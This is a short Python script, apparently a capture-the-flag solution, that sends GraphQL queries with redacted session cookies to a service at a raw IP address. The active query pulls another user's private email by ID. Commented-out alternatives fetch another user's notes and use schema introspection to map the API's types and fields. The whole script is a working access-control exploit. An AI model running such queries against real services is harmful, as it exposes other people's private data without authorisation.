import requests

def main() -> None:
    d = {
        'sessionid': '<Redacted>',
        'csrftoken': '<Redacted>',
        'session': '<Redacted>',
    }
    with requests.Session() as s:
        s.cookies.update(d)
        r = s.post(
            'http://202.38.93.111:15001/graphql',
            json={
                # 'query': '{ notes(userId: 2) { id\ncontents }}'
                'query': '{ user(id: 1) { privateEmail } }'
                # 'query': '{ __schema { types { name } } }'
                # 'query': '{ __type(name: "GUser") { name,fields { name,type { name,kind } } } }'
            }
        )
        print(r.text)

if __name__ == '__main__':
    main()
